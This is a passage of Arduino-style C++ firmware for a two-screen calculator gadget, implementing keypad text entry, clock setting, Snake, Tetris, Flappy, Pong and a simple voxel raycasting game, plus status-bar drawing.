  if (kbOpen) {
    if (k == K_MODE) { kbOpen = false; return; }
    if (k == '=') { textDone(); return; }
    if (k == K_ALPHA) { textBack(); return; }
    if (k == K_SHIFT) { textType(' '); return; }
    if (k == '.') { tMask = !tMask; return; }
    if (k == K_EXP) { kbPageStep(1); return; }
    if (k == K_ANS) { kbPageStep(-1); return; }
    if (k == K_LEFT) { kbMove(-1, 0); return; }
    if (k == K_RIGHT) { kbMove(1, 0); return; }
    if (k == K_UP) { kbMove(0, -1); return; }
    if (k == K_DOWN) { kbMove(0, 1); return; }
    for (int r = 0; r < 3; r++) for (int c = 0; c < 5; c++) if (KBMAP[r][c] == k) {
      char ch = kbCell(kbPage, kbWx + c, kbWy + r);
      if (ch) { textType(ch); kbFlash = r * 5 + c; kbFlashUntil = millis() + 150; }
      return;
    }
  } else {
    if (k == K_UP) { kbOpen = true; return; }
    if (k == '=') { textDone(); return; }
    if (k == K_MODE) { enter(tReturn); return; }
    if (k == K_DEL || k == K_ALPHA) { textBack(); return; }
    if (k == '.') { tMask = !tMask; return; }
  }
}

// ============================ TIME SET ============================
void enterTimeSet() {
  struct tm t;
  if (timeValid()) { localTm(t); tsF[0] = t.tm_year + 1900; tsF[1] = t.tm_mon + 1; tsF[2] = t.tm_mday; tsF[3] = t.tm_hour; tsF[4] = t.tm_min; }
  else { localTm(t); tsF[0] = 2026; tsF[1] = 1; tsF[2] = 1; tsF[3] = t.tm_hour; tsF[4] = t.tm_min; }
  tsF[5] = tzOffset / 900; tsSel = 0; tsTyped = 0;
  enter(S_TIMESET);
}
void tsClamp() {
  tsF[0] = iclamp(tsF[0], 2024, 2099); tsF[1] = iclamp(tsF[1], 1, 12);
  tsF[2] = iclamp(tsF[2], 1, daysInMonth(tsF[0], tsF[1]));
  tsF[3] = iclamp(tsF[3], 0, 23); tsF[4] = iclamp(tsF[4], 0, 59); tsF[5] = iclamp(tsF[5], -48, 56);
}
void timeSetKey(uint8_t k) {
  static const int LEN[6] = {4, 2, 2, 2, 2, 0};
  if (k == K_LEFT) { tsClamp(); tsTyped = 0; if (tsSel > 0) tsSel--; else enter(S_CLOCK); return; }
  if (k == K_RIGHT) { tsClamp(); tsTyped = 0; if (tsSel < 5) tsSel++; return; }
  if (k == K_UP || k == K_DOWN) {
    int d = (k == K_UP) ? 1 : -1; tsTyped = 0;
    static const int LO[6] = {2024, 1, 1, 0, 0, -48}, HI[6] = {2099, 12, 31, 23, 59, 56};
    int hi = HI[tsSel]; if (tsSel == 2) hi = daysInMonth(tsF[0], tsF[1]);
    tsF[tsSel] += d; if (tsF[tsSel] > hi) tsF[tsSel] = LO[tsSel]; if (tsF[tsSel] < LO[tsSel]) tsF[tsSel] = hi;
    return;
  }
  if (k >= '0' && k <= '9' && tsSel < 5) {
    int dgt = k - '0';
    tsF[tsSel] = (tsTyped == 0) ? dgt : tsF[tsSel] * 10 + dgt;
    tsTyped++; if (tsTyped >= LEN[tsSel]) tsTyped = 0;
    return;
  }
  if (k == '=') {
    tsClamp(); tzOffset = tsF[5] * 900;
    time_t local = civilToEpoch(tsF[0], tsF[1], tsF[2], tsF[3], tsF[4]);
    setUtc(local - tzOffset); toast("Time set"); enter(S_CLOCK);
  }
}

// ============================ GAMES ============================
void gameOver() {
  gs = GS_OVER; overAt = millis();
  if (gScore > best[curGame]) { best[curGame] = gScore; prefs.putUShort(("hs" + String(curGame)).c_str(), gScore); }
  dirtyB = true;
}
// ---- Snake
void snPlaceApple() {
  for (int t = 0; t < 200; t++) {
    uint8_t x = random(SN_C), y = random(SN_R); bool ok = true;
    for (int i = 0; i < snLen; i++) if (snX[i] == x && snY[i] == y) { ok = false; break; }
    if (ok) { snAX = x; snAY = y; return; }
  }
}
void snInit() {
  snLen = 3; snX[0] = SN_C / 2; snY[0] = SN_R / 2; snX[1] = snX[0] - 1; snY[1] = snY[0]; snX[2] = snX[1] - 1; snY[2] = snY[0];
  snDir = snNext = 1; gScore = 0; snPlaceApple(); snLast = millis();
}
void snKey(uint8_t k) {
  int nd = -1;
  if (k == K_UP) nd = 0; else if (k == K_RIGHT) nd = 1; else if (k == K_DOWN) nd = 2; else if (k == K_LEFT) nd = 3;
  if (nd >= 0 && (nd + 2) % 4 != snDir) snNext = nd;
}
void snUpdate() {
  int iv = 180 - gScore * 3; if (iv < 70) iv = 70;
  if (millis() - snLast < (uint32_t)iv) return;
  snLast = millis(); snDir = snNext;
  for (int i = snLen; i > 0; i--) { snX[i] = snX[i - 1]; snY[i] = snY[i - 1]; }
  switch (snDir) {
    case 0: snY[0] = snY[0] ? snY[0] - 1 : SN_R - 1; break;
    case 1: snX[0] = snX[0] < SN_C - 1 ? snX[0] + 1 : 0; break;
    case 2: snY[0] = snY[0] < SN_R - 1 ? snY[0] + 1 : 0; break;
    case 3: snX[0] = snX[0] ? snX[0] - 1 : SN_C - 1; break;
  }
  for (int i = 1; i < snLen; i++) if (snX[i] == snX[0] && snY[i] == snY[0]) { gameOver(); return; }
  if (snX[0] == snAX && snY[0] == snAY) { gScore++; if (snLen < SN_MAX - 1) snLen++; snPlaceApple(); }
}
void snDraw() {
  dA.fillRect(snAX * 4 + 1, snAY * 4, 2, 4, WH); dA.fillRect(snAX * 4, snAY * 4 + 1, 4, 2, WH);
  for (int i = 0; i < snLen; i++) {
    if (i == 0) dA.fillRect(snX[i] * 4, snY[i] * 4, 4, 4, WH); else dA.drawRect(snX[i] * 4, snY[i] * 4, 4, 4, WH);
  }
}
// ---- Tetris
bool tCell(int p, int r, int x, int y) { return (TET[p][r] >> (15 - 4 * y - x)) & 1; }
bool tHit(int px, int py, int r) {
  for (int y = 0; y < 4; y++) for (int x = 0; x < 4; x++) if (tCell(tP, r, x, y)) {
    int bx = px + x, by = py + y;
    if (bx < 0 || bx >= 10 || by >= 16) return true;
    if (by >= 0 && tB[by][bx]) return true;
  }
  return false;
}
void tSpawn() {
  tP = tNext; tNext = random(7); tR = 0; tX = 3; tY = -1;
  if (tHit(tX, tY, tR)) gameOver();
}
void tInit() {
  memset(tB, 0, sizeof(tB)); tP = random(7); tNext = random(7); tR = 0; tX = 3; tY = -1;
  gScore = 0; tLines = 0; tHeld = false; tLastFall = millis(); tNextMove = tSoft = 0;
}
void tLock() {
  for (int y = 0; y < 4; y++) for (int x = 0; x < 4; x++) if (tCell(tP, tR, x, y)) {
    int bx = tX + x, by = tY + y; if (by >= 0 && bx >= 0 && bx < 10 && by < 16) tB[by][bx] = 1;
  }
  int cleared = 0;
  for (int y = 15; y >= 0; y--) {
    bool full = true; for (int x = 0; x < 10; x++) if (!tB[y][x]) { full = false; break; }
    if (full) { for (int yy = y; yy > 0; yy--) memcpy(tB[yy], tB[yy - 1], 10); memset(tB[0], 0, 10); cleared++; y++; }
  }
  static const int PTS[5] = {0, 100, 300, 500, 800};
  gScore += PTS[cleared]; tLines += cleared;
  tSpawn();
}
void tKey(uint8_t k) {
  if (k == K_UP || k == '5') {
    int nr = (tR + 1) % 4; static const int KICK[4] = {0, -1, 1, -2};
    for (int i = 0; i < 4; i++) if (!tHit(tX + KICK[i], tY, nr)) { tX += KICK[i]; tR = nr; break; }
  } else if (k == '=') {
    while (!tHit(tX, tY + 1, tR)) { tY++; gScore += 2; }
    tLock(); tLastFall = millis();
  }
}
void tUpdate() {
  uint32_t now = millis();
  bool l = held(K_LEFT), r = held(K_RIGHT);
  if (l || r) {
    int dx = l ? -1 : 1;
    if (!tHeld) { tHeld = true; tNextMove = now + 170; if (!tHit(tX + dx, tY, tR)) tX += dx; }
    else if (now >= tNextMove) { tNextMove = now + 60; if (!tHit(tX + dx, tY, tR)) tX += dx; }
  } else tHeld = false;
  if (held(K_DOWN) && now >= tSoft) { tSoft = now + 50; if (!tHit(tX, tY + 1, tR)) { tY++; gScore++; tLastFall = now; } }
  int iv = 420 - (int)(tLines / 10) * 35; if (iv < 90) iv = 90;
  if (now - tLastFall >= (uint32_t)iv) { tLastFall = now; if (!tHit(tX, tY + 1, tR)) tY++; else tLock(); }
}
void tDraw() {
  const int x0 = 44;
  dA.drawFastVLine(x0 - 1, 0, 64, WH); dA.drawFastVLine(x0 + 40, 0, 64, WH);
  for (int y = 0; y < 16; y++) for (int x = 0; x < 10; x++) if (tB[y][x]) dA.fillRect(x0 + x * 4, y * 4, 3, 3, WH);
  for (int y = 0; y < 4; y++) for (int x = 0; x < 4; x++) if (tCell(tP, tR, x, y) && tY + y >= 0) dA.fillRect(x0 + (tX + x) * 4, (tY + y) * 4, 3, 3, WH);
  dA.setTextColor(WH);
  txtC(dA, "SCORE", 6, 1, 21); txtC(dA, String(gScore), 16, 1, 21);
  txtC(dA, "LINES", 34, 1, 21); txtC(dA, String(tLines), 44, 1, 21);
  txtC(dA, "NEXT", 6, 1, 107);
  for (int y = 0; y < 4; y++) for (int x = 0; x < 4; x++) if (tCell(tNext, 0, x, y)) dA.fillRect(99 + x * 4, 22 + y * 4, 3, 3, WH);
  txtC(dA, "LVL", 44, 1, 107); txtC(dA, String(tLines / 10 + 1), 54, 1, 107);
}
// ---- Flappy
void fInit() {
  fy = 28; fv = 0; gScore = 0;
  fp[0].x = 150; fp[0].gy = random(8, 26); fp[0].passed = false;
  fp[1].x = 220; fp[1].gy = random(8, 26); fp[1].passed = false;
}
void fKey(uint8_t k) { if (k == K_UP || k == '=') fv = -3.5f; }
void fUpdate(uint32_t dt) {
  float f = dt / 33.0f; if (f > 2) f = 2;
  fv += 0.3f * f; fy += fv * f;
  if (fy < 0) { fy = 0; fv = 0; }
  if (fy + 4 >= 62) { gameOver(); return; }
  for (int i = 0; i < 2; i++) {
    fp[i].x -= 1.4f * f;
    if (fp[i].x + 12 < 0) { fp[i].x = fp[1 - i].x + 70; fp[i].gy = random(8, 26); fp[i].passed = false; }
    if (!fp[i].passed && fp[i].x + 12 < 10) { fp[i].passed = true; gScore++; }
    if (14 > fp[i].x && 10 < fp[i].x + 12 && (fy < fp[i].gy || fy + 4 > fp[i].gy + FGAP)) { gameOver(); return; }
  }
}
void fDraw() {
  for (int i = 0; i < 2; i++) {
    int px = (int)fp[i].x, gy = fp[i].gy;
    dA.fillRect(px, 0, 12, gy, WH); dA.fillRect(px - 1, gy - 4, 14, 4, WH);
    dA.fillRect(px, gy + FGAP, 12, 62 - gy - FGAP, WH); dA.fillRect(px - 1, gy + FGAP, 14, 4, WH);
  }
  dA.drawFastHLine(0, 62, 128, WH);
  dA.fillRect(10, (int)fy, 5, 5, WH); dA.drawPixel(13, (int)fy + 1, BK);
  dA.setTextColor(WH); txtC(dA, String(gScore), 1, 1, 64);
}
// ---- Pong
void pServe() { bX = 64; bY = 32; bDX = random(2) ? 1.5f : -1.5f; bDY = random(2) ? 1.0f : -1.0f; pServeAt = millis() + 700; }
void pInit() { pLY = pRY = 24; pSL = pSR = 0; aiSpeed = 0.6f; pHits = pMiss = 0; gScore = 0; pServe(); }
void pPoint(bool player) {
  if (player) { pSL++; pHits++; if (pHits % 3 == 0 && aiSpeed < 1.2f) aiSpeed += 0.1f; }
  else        { pSR++; pMiss++; if (pMiss % 2 == 0 && aiSpeed > 0.4f) aiSpeed -= 0.1f; }
  gScore = pSL; dirtyB = true;
  pServe();
}
void pUpdate(uint32_t dt) {
  float f = dt / 16.0f; if (f > 3) f = 3;
  if (held(K_UP)) pLY -= 0.16f * dt;
  if (held(K_DOWN)) pLY += 0.16f * dt;
  if (pLY < 0) pLY = 0; if (pLY > 64 - PH) pLY = 64 - PH;
  if (millis() < pServeAt) return;
  bX += bDX * f; bY += bDY * f;
  if (bY <= 0) { bY = 0; bDY = -bDY; }
  if (bY >= 62) { bY = 62; bDY = -bDY; }
  if (bDX < 0 && bX <= PW && bY + 2 >= pLY && bY <= pLY + PH) {
    bX = PW; bDX = -bDX * 1.04f; bDY += (bY - (pLY + PH / 2)) / 8.0f;
  }
  if (bDX > 0 && bX >= 128 - PW - 2 && bY + 2 >= pRY && bY <= pRY + PH) {
    bX = 128 - PW - 2; bDX = -bDX * 1.04f; bDY += (bY - (pRY + PH / 2)) / 8.0f;
  }
  if (bDY > 2.5f) bDY = 2.5f; if (bDY < -2.5f) bDY = -2.5f;
  if (bDX > 3.2f) bDX = 3.2f; if (bDX < -3.2f) bDX = -3.2f;
  if (bX < -2) { pPoint(false); return; }
  if (bX > 130) { pPoint(true); return; }
  float center = pRY + PH / 2.0f;
  if (bDX > 0) { float target = bY + random(-3, 4); pRY += (target - center) * 0.15f * aiSpeed * f; }
  else pRY += (32 - center) * 0.05f * aiSpeed * f;
  if (pRY < 0) pRY = 0; if (pRY > 64 - PH) pRY = 64 - PH;
}
void pDraw() {
  for (int y = 0; y < 64; y += 6) dA.drawFastVLine(64, y, 3, WH);
  dA.fillRect(0, (int)pLY, PW, PH, WH); dA.fillRect(128 - PW, (int)pRY, PW, PH, WH);
  dA.fillRect((int)bX, (int)bY, 2, 2, WH);
  dA.setTextColor(WH); txtR(dA, String(pSL), 56, 2, 2); txtL(dA, String(pSR), 72, 2, 2);
}

// ---------------------------------------------------------------- Minecraft: engine
static const uint8_t MC_BAYER[4][4] = {{0, 8, 2, 10}, {12, 4, 14, 6}, {3, 11, 1, 9}, {15, 7, 13, 5}};

// Display A runs with rotation 2, so write straight into the buffer with the flip applied.
static inline void mcPxSet(uint8_t *buf, int x, int y, bool on) {
  int rx = 127 - x, ry = 63 - y; uint8_t m = 1 << (ry & 7); uint8_t &p = buf[rx + ((ry >> 3) << 7)];
  if (on) p |= m; else p &= ~m;
}
static inline void mcPxXor(uint8_t *buf, int x, int y) {
  if (x < 0 || x > 127 || y < 0 || y > 63) return;
  int rx = 127 - x, ry = 63 - y; buf[rx + ((ry >> 3) << 7)] ^= (1 << (ry & 7));
}
static inline int mcYi(float y) { if (y < -2000.0f) return -2000; if (y > 2000.0f) return 2000; return (int)floorf(y + 0.5f); }
static inline int mcFog(float d) { int f = (int)((d - 5.0f) * 1.3f); return f < 0 ? 0 : f; }   // far things dither away
static inline bool mcBit(uint8_t m, int k) { return k >= 0 && k < 8 && ((m >> k) & 1); }

// Height of the highest block top the player can stand on in this cell (blocks whose bottom is at or below the feet).
static float mcSupport(int cx, int cz, float feet) {
  uint8_t m = mcVox[cx][cz]; int lim = (int)floorf(feet + 0.01f);
  if (lim > MC_D - 1) lim = MC_D - 1;
  for (int k = lim; k >= 0; k--) if (mcBit(m, k)) return (float)(k + 1);
  return 0.0f;
}
static bool mcClear(float x, float z) {            // can the player stand here? (steps up 1 block, head needs 2 free levels)
  const float r = 0.22f;
  for (int i = 0; i < 4; i++) {
    int cx = (int)floorf(x + ((i & 1) ? r : -r)), cz = (int)floorf(z + ((i & 2) ? r : -r));
    if (cx < 0 || cz < 0 || cx >= MC_W || cz >= MC_H) return false;
    int g = (int)mcSupport(cx, cz, mcFeet);
    if (mcBit(mcVox[cx][cz], g) || mcBit(mcVox[cx][cz], g + 1)) return false;
  }
  return true;
}
static void mcMove(float forward, float side) {
  float dx = cosf(mcYaw) * forward - sinf(mcYaw) * side;
  float dz = sinf(mcYaw) * forward + cosf(mcYaw) * side;
  if (mcClear(mcX + dx, mcZ)) mcX += dx;
  if (mcClear(mcX, mcZ + dz)) mcZ += dz;
}
void mcUpdate(uint32_t dt) {
  float s = dt * 0.001f;
  if (held(K_LEFT))  mcYaw -= 2.0f * s;
  if (held(K_RIGHT)) mcYaw += 2.0f * s;
  if (held(K_UP))    mcPitch += 100.0f * s;
  if (held(K_DOWN))  mcPitch -= 100.0f * s;
  mcPitch = fmaxf(-MC_PITCH, fminf(MC_PITCH, mcPitch));
  float f = (held('8') ? 1.0f : 0.0f) - (held('2') ? 1.0f : 0.0f);
  float sd = (held('6') ? 1.0f : 0.0f) - (held('4') ? 1.0f : 0.0f);
  if (f != 0.0f || sd != 0.0f) {
    float k = (f != 0.0f && sd != 0.0f) ? 0.7071f : 1.0f;
    mcMove(f * k * 3.2f * s, sd * k * 2.6f * s);
  }
  float gh = mcSupport((int)mcX, (int)mcZ, mcFeet);
  if (mcVy != 0.0f || mcFeet > gh + 0.001f) {                 // in the air
    if (mcVy > 0.0f && mcBit(mcVox[(int)mcX][(int)mcZ], (int)(mcFeet + 1.8f))) mcVy = 0.0f;   // bumped your head
    mcVy -= 26.0f * s; mcFeet += mcVy * s;
    if (mcFeet <= gh) { mcFeet = gh; mcVy = 0.0f; }
  } else if (mcFeet < gh) mcFeet = fminf(gh, mcFeet + 7.0f * s);   // stepping up a block
}

// Looks along the crosshair. 0 = nothing, 1 = block (hit + the empty cell in front of it), 2 = floor
static uint8_t mcTrace(float maxD, int &hx, int &hy, int &hz, int &lx, int &ly, int &lz) {
  const float eye = mcFeet + 1.5f, dx = cosf(mcYaw), dz = sinf(mcYaw), slope = mcPitch / (64.0f / MC_PL);
  lx = (int)mcX; lz = (int)mcZ; ly = (int)floorf(eye);
  for (float d = 0.04f; d <= maxD; d += 0.04f) {
    int cx = (int)floorf(mcX + dx * d), cz = (int)floorf(mcZ + dz * d), cy = (int)floorf(eye + slope * d);
    if (cx < 0 || cz < 0 || cx >= MC_W || cz >= MC_H) return 0;
    if (cy < 0) { hx = cx; hy = -1; hz = cz; return 2; }
    if (mcBit(mcVox[cx][cz], cy)) { hx = cx; hy = cy; hz = cz; return 1; }
    lx = cx; ly = cy; lz = cz;
  }
  return 0;
}
static void mcBreakBlock() {                           // removes exactly the block you aim at
  int hx, hy, hz, lx, ly, lz;
  if (mcTrace(MC_REACH, hx, hy, hz, lx, ly, lz) != 1) return;
  mcVox[hx][hz] &= ~(1 << hy);
  if (mcPlaced) mcPlaced--;
}
static void mcPlaceBlock() {
  int hx, hy, hz, lx, ly, lz;
  uint8_t kind = mcTrace(MC_REACH, hx, hy, hz, lx, ly, lz);
  if (kind == 0) return;
  int px = lx, py = ly, pz = lz;
  if (kind == 2) { px = hx; py = 0; pz = hz; }
  if (px < 0 || pz < 0 || px >= MC_W || pz >= MC_H || py < 0 || py >= MC_D || mcBit(mcVox[px][pz], py)) return;
  bool overlap = (mcX + 0.22f > px && mcX - 0.22f < px + 1 && mcZ + 0.22f > pz && mcZ - 0.22f < pz + 1);
  if (overlap && py + 1 > mcFeet && py < mcFeet + 1.79f) return;      // not inside yourself
  mcVox[px][pz] |= (1 << py); mcPlaced++;
}

void mcInit() {
  memset(mcVox, 0, sizeof(mcVox));
  mcPlaced = 0; mcHintShown = 255;
  mcX = MC_W / 2 + 0.5f; mcZ = MC_H / 2 + 0.5f; mcYaw = 0.0f; mcPitch = 0.0f; mcFeet = 0.0f; mcVy = 0.0f;
}

// ---- renderer
// One ray per screen column, walking the grid cell by cell (DDA). The cells the ray crosses are collected first,
// then drawn far to near (painter's algorithm), so blocks can float, hang over the floor, or have gaps under them.
struct McCell { int16_t mx, mz; uint8_t side; float d0, d1; };

// A horizontal face (floor, top of a block, underside of a floating block) at height h, between depths d0..d1.
static void mcHFace(uint8_t *buf, int sx, float rdx, float rdz, int horizon, float eye, float F, float h, float d0, float d1, bool floorGrid) {
  const float rel = eye - h; if (fabsf(rel) < 0.01f) return;
  if (d0 < 0.01f) d0 = 0.01f; if (d1 < d0) d1 = d0;
  int ya = mcYi(horizon + rel * F / d0), yb = mcYi(horizon + rel * F / d1);
  if (ya > yb) { int t = ya; ya = yb; yb = t; }
  yb -= 1; if (ya < 0) ya = 0; if (yb > 63) yb = 63;
  for (int y = ya; y <= yb; y++) {
    const float dy = (y + 0.5f) - horizon; if (dy * rel <= 0.0f) continue;
    const float perp = rel * F / dy, wx = mcX + rdx * perp, wz = mcZ + rdz * perp;
    const float fx = wx - floorf(wx), fz = wz - floorf(wz), ed = perp / F;
    const float dp = perp * perp / (fabsf(rel) * F);                 // depth covered by one screen row
    const float ex = fmaxf(ed, fabsf(rdx) * dp), ez = fmaxf(ed, fabsf(rdz) * dp);   // keeps lines unbroken
    const bool line = fx < ex || fx > 1.0f - ex || fz < ez || fz > 1.0f - ez;
    const bool bright = 16 - mcFog(perp) > MC_BAYER[y & 3][sx & 3];
    mcPxSet(buf, sx, y, floorGrid ? (line && bright) : ((!MC_OUTLINE || !line) && bright));
  }
}
// The front face of the block at level k, where the ray enters the cell at depth dEnter.
static void mcVFace(uint8_t *buf, int sx, float rdx, float rdz, int side, int horizon, float eye, float F, int k, float dEnter) {
  const float d = dEnter > 0.01f ? dEnter : 0.01f;
  const float hit = side ? (mcX + rdx * dEnter) : (mcZ + rdz * dEnter);
  const float fu = hit - floorf(hit), ed = d / F;                    // ed = one pixel, in block units
  const bool edgeU = MC_OUTLINE && (fu < ed || fu > 1.0f - ed);
  int ya = mcYi(horizon + (eye - (k + 1)) * F / d), yb = mcYi(horizon + (eye - k) * F / d) - 1;
  if (ya < 0) ya = 0; if (yb > 63) yb = 63;
  const int lum = 16 - mcFog(d);
  for (int y = ya; y <= yb; y++) {
    const float z = eye - ((y + 0.5f) - horizon) * d / F, fz = z - floorf(z);
    const bool edge = edgeU || (MC_OUTLINE && (fz < ed || fz > 1.0f - ed));
    mcPxSet(buf, sx, y, !edge && lum > MC_BAYER[y & 3][sx & 3]);
  }
}
static void mcRenderWorld() {
  uint8_t *buf = dA.getBuffer();
  const float PL = MC_PL, F = 64.0f / PL, FAR = 15.0f;
  const float dirX = cosf(mcYaw), dirZ = sinf(mcYaw), plX = -dirZ * PL, plZ = dirX * PL;
  const int horizon = 32 + (int)mcPitch;
  const float eye = mcFeet + 1.5f;
  const int sx0 = (int)mcX, sz0 = (int)mcZ;
  McCell cells[40];

  for (int sx = 0; sx < 128; sx++) {
    const float cam = (sx + 0.5f) * (1.0f / 64.0f) - 1.0f;
    const float rdx = dirX + plX * cam, rdz = dirZ + plZ * cam;
    const float ddx = fabsf(rdx) < 1e-6f ? 1e6f : fabsf(1.0f / rdx), ddz = fabsf(rdz) < 1e-6f ? 1e6f : fabsf(1.0f / rdz);
    int mx = sx0, mz = sz0, stx, stz; float sdx, sdz;
    if (rdx < 0) { stx = -1; sdx = (mcX - mx) * ddx; } else { stx = 1; sdx = (mx + 1.0f - mcX) * ddx; }
    if (rdz < 0) { stz = -1; sdz = (mcZ - mz) * ddz; } else { stz = 1; sdz = (mz + 1.0f - mcZ) * ddz; }

    int n = 0, side = 0; float dEnter = 0.0f;
    while (n < 40) {                                   // 1) collect the cells this ray passes through
      const float dExit = sdx < sdz ? sdx : sdz;
      cells[n].mx = mx; cells[n].mz = mz; cells[n].side = side; cells[n].d0 = dEnter; cells[n].d1 = dExit; n++;
      if (sdx < sdz) { dEnter = sdx; sdx += ddx; mx += stx; side = 0; }
      else           { dEnter = sdz; sdz += ddz; mz += stz; side = 1; }
      if (dEnter > FAR) break;
    }
    for (int i = n - 1; i >= 0; i--) {                 // 2) draw them far to near
      const McCell &c = cells[i];
      const uint8_t m  = (c.mx >= 0 && c.mz >= 0 && c.mx < MC_W && c.mz < MC_H) ? mcVox[c.mx][c.mz] : 0;
      const uint8_t pm = (i > 0 && cells[i - 1].mx >= 0 && cells[i - 1].mz >= 0 && cells[i - 1].mx < MC_W && cells[i - 1].mz < MC_H) ? mcVox[cells[i - 1].mx][cells[i - 1].mz] : 0;
      if (!(m & 1)) mcHFace(buf, sx, rdx, rdz, horizon, eye, F, 0.0f, c.d0, c.d1, true);          // floor grid
      for (int k = 0; k < MC_D; k++) if (mcBit(m, k)) {
        if (!mcBit(m, k + 1) && (k + 1) < eye - 0.01f) mcHFace(buf, sx, rdx, rdz, horizon, eye, F, (float)(k + 1), c.d0, c.d1, false);   // top
        if (k > 0 && !mcBit(m, k - 1) && k > eye + 0.01f) mcHFace(buf, sx, rdx, rdz, horizon, eye, F, (float)k, c.d0, c.d1, false);      // underside
      }
      if (i > 0) for (int k = 0; k < MC_D; k++) if (mcBit(m, k) && !mcBit(pm, k)) mcVFace(buf, sx, rdx, rdz, c.side, horizon, eye, F, k, c.d0);   // front faces
    }
  }
  for (int i = 2; i <= 4; i++) {                      // crosshair (inverts whatever is behind it)
    mcPxXor(buf, 64 - i, 32); mcPxXor(buf, 64 + i, 32); mcPxXor(buf, 64, 32 - i); mcPxXor(buf, 64, 32 + i);
  }
}

void mcKey(uint8_t k) {
  dirtyA = dirtyB = true;
  if (k == '/') { if (mcVy == 0.0f && mcFeet <= mcSupport((int)mcX, (int)mcZ, mcFeet) + 0.001f) mcVy = 7.5f; }
  else if (k == K_DEL) mcBreakBlock();
  else if (k == K_AC) mcPlaceBlock();
}

// ---------------------------------------------------------------- Minecraft: screens
void drawHint(const String &s);
void mcDrawA() { mcRenderWorld(); }
// Display B in the game. Everything stays inside 128 px = 21 characters per line.
void mcDrawB() {
  Adafruit_SSD1306 &d = dB; d.setTextColor(WH); d.setTextSize(1);
  txtC(d, String(mcPlaced), 27, 2, 64);
  txtC(d, mcPlaced == 1 ? "block placed" : "blocks placed", 45, 1, 64);
  static const char *HINTS[4] = {"ARROWS look  / jump", "8/2 move  4/6 strafe", "DEL break  AC place", "MODE = exit"};
  drawHint(HINTS[mcHintShown % 4]);
}

void gameInit() {
  switch (curGame) { case 0: snInit(); break; case 1: tInit(); break; case 2: fInit(); break; case 3: pInit(); break; default: mcInit(); break; }
  gs = GS_READY; bShown = 0xFFFF; dirtyA = dirtyB = true;
}
void startGame(int i) { curGame = i; gameInit(); lastFrame = millis(); enter(S_GAME); }
void gameBegin() { snLast = millis(); tLastFall = millis(); if (curGame == 3) pServeAt = millis() + 700; }
void gameKey(uint8_t k) {
  if (curGame == 4) { mcKey(k); return; }
  dirtyA = true;
  if (gs == GS_PAUSE) { if (k == K_ALPHA || k == '=') { gs = GS_PLAY; lastFrame = millis(); gameBegin(); } dirtyB = true; return; }
  if (gs == GS_OVER)  { if (millis() - overAt > 500 && (k == '=' || k == K_UP)) gameInit(); return; }
  if (gs == GS_READY) {
    if (k == '=' || k == K_UP || k == K_DOWN || k == K_LEFT || k == K_RIGHT) { gs = GS_PLAY; lastFrame = millis(); gameBegin(); dirtyB = true; } else return;
  }
  if (k == K_ALPHA) { gs = GS_PAUSE; dirtyB = true; return; }
  switch (curGame) { case 0: snKey(k); break; case 1: tKey(k); break; case 2: fKey(k); break; default: break; }
}
void gameTick() {
  uint32_t now = millis();
  if (now - lastFrame < 33) return;
  uint32_t dt = now - lastFrame; lastFrame = now; if (dt > 100) dt = 100;
  if (curGame == 4) {
    mcUpdate(dt); dirtyA = true;
    uint8_t hint = (now / 2500) % 4;
    if (hint != mcHintShown) { mcHintShown = hint; dirtyB = true; }
    return;
  }
  if (gs == GS_PLAY) {
    switch (curGame) { case 0: snUpdate(); break; case 1: tUpdate(); break; case 2: fUpdate(dt); break; default: pUpdate(dt); break; }
    dirtyA = true;
  }
  if (gScore != bShown || gs != bState) { bShown = gScore; bState = gs; dirtyB = true; }
}
void gameDrawA() {
  if (curGame == 4) { mcDrawA(); return; }
  switch (curGame) { case 0: snDraw(); break; case 1: tDraw(); break; case 2: fDraw(); break; default: pDraw(); break; }
  if (gs == GS_PLAY) return;
  dA.fillRoundRect(10, 13, 108, 38, 4, BK); dA.drawRoundRect(10, 13, 108, 38, 4, WH); dA.setTextColor(WH);
  if (gs == GS_READY) { txtC(dA, GAME_NAMES[curGame], 18, 1, 64); txtC(dA, "Press = to start", 28, 1, 64); txtC(dA, "MODE = exit", 38, 1, 64); }
  else if (gs == GS_PAUSE) { txtC(dA, "PAUSED", 18, 1, 64); txtC(dA, "ALPHA = resume", 28, 1, 64); txtC(dA, "MODE = exit", 38, 1, 64); }
  else {
    String t = "GAME OVER"; if (curGame == 3) t = (pSL >= 7) ? "YOU WIN!" : "CPU WINS";
    txtC(dA, t, 18, 1, 64); txtC(dA, "Score " + String(gScore), 28, 1, 64); txtC(dA, "= retry MODE quit", 38, 1, 64);
  }
}

// ============================ DRAWING: COMMON ============================
void headerA(const String &t) {
  (void)t;
}
void drawHint(const String &s) {
  dB.fillRect(0, 55, 128, 9, WH); dB.setTextColor(BK); dB.setTextSize(1);
  dB.setCursor(imax(0, 64 - tw(s, 1) / 2), 56); dB.print(s); dB.setTextColor(WH);
}
void drawBattery(Adafruit_SSD1306 &d, int x, int y, int pct) {
  d.drawRect(x, y, 15, 7, WH); d.fillRect(x + 15, y + 2, 2, 3, WH);
  d.fillRect(x + 2, y + 2, (pct * 11) / 100, 3, WH);
}
String screenTitleB() {
  switch (screen) {
    case S_CALC: return "";
    case S_MENU: return "Menu";
    case S_TEXT: return tTitle;
    case S_NOTEVIEW: return baseName(nvPath);
    case S_DCHAT: return dcDm[dcCur].name;
    case S_AI: return "AI";
    case S_PORTAL: return "Portal active";
    case S_PORTAL_SUBMISSIONS:
      if (portalSubmissions.empty()) return "Portal submissions";
      return "Submission " + String(portalSubmission + 1) + "/" + String(portalSubmissions.size());
    case S_CLOCK: return "Clock";
    case S_TIMESET: return "Set time";
    case S_GAME: return GAME_NAMES[curGame];
    case S_ABOUT: return "About";
    case S_OTA: return "OTA update";
    case S_ERASE: return "Erase all data";
    default: return lTitle.length() ? lTitle : "Calculator";
  }
}
void drawStatusBar() {
  Adafruit_SSD1306 &d = dB; d.setTextColor(WH); d.setTextSize(1);
  d.setCursor(0, 1); d.print(timeStr());
  String p = String(batPct) + "%"; int px = 104 - tw(p, 1);
  d.setCursor(px, 1); d.print(p);
  drawBattery(d, 109, 1, batPct);
  int wx = px - 16;                                 // wifi bars sit just left of the battery %
  if (WiFi.status() == WL_CONNECTED) {
    int r = WiFi.RSSI(), lv = r > -55 ? 4 : r > -65 ? 3 : r > -75 ? 2 : 1;
    for (int i = 0; i < 4; i++) { int h = 2 + i * 2; if (i < lv) d.fillRect(wx + i * 3, 9 - h, 2, h, WH); else d.drawPixel(wx + i * 3, 8, WH); }
  } else if (notesOn || portalOn) { d.setCursor(wx, 1); d.print("AP"); }
